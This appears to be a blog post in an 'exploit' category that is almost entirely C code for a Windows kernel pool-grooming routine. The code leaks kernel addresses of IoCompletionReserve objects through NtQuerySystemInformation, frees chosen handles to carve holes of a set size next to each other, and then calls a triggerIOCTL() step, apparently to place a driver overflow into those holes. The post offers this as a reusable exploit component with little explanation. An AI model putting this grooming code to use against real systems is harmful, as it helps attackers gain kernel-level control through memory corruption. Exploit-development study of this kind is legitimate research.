---
layout: post
title: "findMemoryWindows()"
category: exploit
tagline: "Supporting tagline"
tags: [exploit]
---
{% include JB/setup %}

## findMemoryWindows()

### struct _PUBLIC_OBJECT_TYPE_INFORMATION
{% highlight C %}
typedef struct _PUBLIC_OBJECT_TYPE_INFORMATION{
	UNICODE_STRING	TypeName;
	ULONG			Reserved[0x2048];
} PUBLIC_OBJECT_TYPE_INFORMATION, *PPUBLIC_OBJECT_TYPE_INFORMATION;
{% endhighlight %}

### findMemoryWindows()
{% highlight C %}
VOID findMemoryWindows(){

	PSYSTEM_HANDLE_INFORMATION_EX handleInfo;
	getHandles(&handleInfo);

	size_t numRetrievedHandles = handleInfo->NumberOfHandles;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = handleInfo->Handles;

	HMODULE h = LoadLibraryA("ntdll.dll");
	if(!h){
		printf("[-]Failed to load module\n");
		exit(1);
	}
	NtQueryObject pNtQueryObject = (NtQueryObject)GetProcAddress(h, "NtQueryObject");

	DWORD obj_addr[50000][2];
	int j = 0;

	for (size_t i = 0; i < numRetrievedHandles; i++){
		if(handleEntry->UniqueProcessId == (HANDLE) GetCurrentProcessId()){
			PUBLIC_OBJECT_TYPE_INFORMATION public_object_type_information;
			DWORD size = sizeof(public_object_type_information);
			NTSTATUS st = pNtQueryObject(handleEntry->HandleValue, ObjectTypeInformation, &public_object_type_information, size, NULL);
			if(!NT_SUCCESS(st)){
				printf("NtQueryObject() Failed!\n");
				__asm int 3

			}
			wchar_t IoCoObj[20] = L"IoCompletionReserve";
			if(!wcscmp(IoCoObj, public_object_type_information.TypeName.Buffer)){
				// printf("IoCo: %ls\n", public_object_type_information.TypeName.Buffer);
				// printf("handleEntry->Object: 0x%08x\n", (DWORD) handleEntry->Object);

				// printf("handleEntry->HandleValue: %d\n", handleEntry->HandleValue);
				obj_addr[j][0] = (DWORD) handleEntry->Object;
				obj_addr[j][1] = (DWORD) handleEntry->HandleValue;
				j++;
			}
		}
		handleEntry++;
	}
	qsort(obj_addr, 50000, 2*sizeof(DWORD), comp);

	
	DWORD alloc;
	DWORD obj;
	int hole_count = 0;
	for(int i = 0; i < 50000; i++){
		obj = obj_addr[i][0];
		alloc = obj_addr[i][0] - 0x30;
		if((alloc & 0xfffff000) == alloc){
			if(obj_addr[i + 2][0] == obj + 0x100 &&
				obj_addr[i + 3][0] == obj + 0x160 &&
				obj_addr[i + 4][0] == obj + 0x1c0 &&
				obj_addr[i + 5][0] == obj + 0x220 &&
				obj_addr[i + 6][0] == obj + 0x280 &&
				obj_addr[i + 7][0] == obj + 0x2e0 &&
				obj_addr[i + 8][0] == obj + 0x340 &&
				obj_addr[i + 9][0] == obj + 0x3a0 &&
				obj_addr[i + 10][0] == obj + 0x400 &&
				obj_addr[i + 11][0] == obj + 0x460 &&
				obj_addr[i + 12][0] == obj + 0x4c0 &&
				obj_addr[i + 13][0] == obj + 0x520 &&
				obj_addr[i + 14][0] == obj + 0x580){

				/*
				printf("[Adjecient Memory Chunk %d]\n", hole_count);
				printf("obj_addr[i][0] = 0x%08x\n", obj_addr[i][0]);
				printf("obj_addr[i + 2][0] = 0x%08x\n", obj_addr[i + 2][0]);
				printf("obj_addr[i + 3][0] = 0x%08x\n", obj_addr[i + 3][0]);
				printf("obj_addr[i + 4][0] = 0x%08x\n", obj_addr[i + 4][0]);
				printf("obj_addr[i + 5][0] = 0x%08x\n", obj_addr[i + 5][0]);
				printf("obj_addr[i + 6][0] = 0x%08x\n", obj_addr[i + 6][0]);
				printf("obj_addr[i + 7][0] = 0x%08x\n", obj_addr[i + 7][0]);
				printf("obj_addr[i + 8][0] = 0x%08x\n", obj_addr[i + 8][0]);
				printf("obj_addr[i + 9][0] = 0x%08x\n", obj_addr[i + 9][0]);
				printf("obj_addr[i + 10][0] = 0x%08x\n", obj_addr[i + 10][0]);
				printf("obj_addr[i + 11][0] = 0x%08x\n", obj_addr[i + 11][0]);
				printf("obj_addr[i + 12][0] = 0x%08x\n", obj_addr[i + 12][0]);
				printf("obj_addr[i + 13][0] = 0x%08x\n", obj_addr[i + 13][0]);
				printf("obj_addr[i + 14][0] = 0x%08x\n\n\n", obj_addr[i + 14][0]);
				*/

				// Create Memory Windows of 0x480 bytes (0x60*12)
				CloseHandle((HANDLE) obj_addr[i + 2][1]);
				CloseHandle((HANDLE) obj_addr[i + 3][1]);
				CloseHandle((HANDLE) obj_addr[i + 4][1]);
				CloseHandle((HANDLE) obj_addr[i + 5][1]);
				CloseHandle((HANDLE) obj_addr[i + 6][1]);
				CloseHandle((HANDLE) obj_addr[i + 7][1]);
				CloseHandle((HANDLE) obj_addr[i + 8][1]);
				CloseHandle((HANDLE) obj_addr[i + 9][1]);
				CloseHandle((HANDLE) obj_addr[i + 10][1]);
				CloseHandle((HANDLE) obj_addr[i + 11][1]);
				CloseHandle((HANDLE) obj_addr[i + 12][1]);
				CloseHandle((HANDLE) obj_addr[i + 13][1]);

				hole_count++;
			}
		}
	}

	triggerIOCTL();

	for(int i = 0; i < 50000; i++){
		obj = obj_addr[i][0];
		alloc = obj_addr[i][0] - 0x30;
		if((alloc & 0xfffff000) == alloc){
			if(obj_addr[i + 14][0] == obj + 0x580)
				CloseHandle((HANDLE) obj_addr[i + 14][1]);
		}
	}
	printf("Total Windows = %d\n", hole_count);

}
{% endhighlight %}

### BOOL getHandles(PSYSTEM_HANDLE_INFORMATION_EX* handleInfo)
{% highlight C %}
BOOL getHandles(PSYSTEM_HANDLE_INFORMATION_EX* handleInfo)
{
	// Source: https://github.com/clymb3r/KdExploitMe/blob/master/ExploitDemos/KernelAddressLeak.cpp

	BOOL functionSuccess = false;
	ULONG handleInfoSize = sizeof(SYSTEM_HANDLE_INFORMATION_EX)+(sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)* 10000);
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH; //Make status be an error so the loop starts.
	*handleInfo = NULL;

	HMODULE hModule = LoadLibraryW(L"ntdll.dll");
	NtQuerySystemInformation pNtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(hModule, "NtQuerySystemInformation");
	FreeLibrary(hModule);
	if (pNtQuerySystemInformation == NULL){
		printf("- Error: Cannot retrieve NtQuerySystemInformation address.\n");
		goto Cleanup;
	}

	ULONG requiredSize = 0;
	while (status == STATUS_INFO_LENGTH_MISMATCH){

		if (*handleInfo){
			free(*handleInfo);
		}

		//Allocate space for NtQuerySystemInformation and call it
		*handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(handleInfoSize);
		ZeroMemory(*handleInfo, handleInfoSize);
		status = (*pNtQuerySystemInformation)((SYSTEM_INFORMATION_CLASS) 64, *handleInfo, handleInfoSize, &requiredSize);
		//If there isn't enough space in the buffer, increase the buffer size
		if (NT_SUCCESS(status)){
			break;
		}
		else if (status == STATUS_INFO_LENGTH_MISMATCH){
			ULONG additionalSpace = sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)* 1000;
			if (ULONG_MAX - additionalSpace < requiredSize){
				printf("- Error: Looping error increasing buffersize for NtQuerySystemInformation.\n");
				goto Cleanup;
			}
			handleInfoSize = requiredSize + additionalSpace;
		} else {
			printf("- Error: Unexpected error from NtQuerySystemInformation. Error: 0x%x\n", status);
			goto Cleanup;
		}
	}
	printf("+ QueryNtHandles returning success: NtQuerySystemInformation returned %i entries.\n", (*handleInfo)->NumberOfHandles);
	functionSuccess = true;

Cleanup:
	if (!functionSuccess){
		if (*handleInfo){
			free(*handleInfo);
			*handleInfo = NULL;
		}
	}
	return functionSuccess;
}
{% endhighlight %}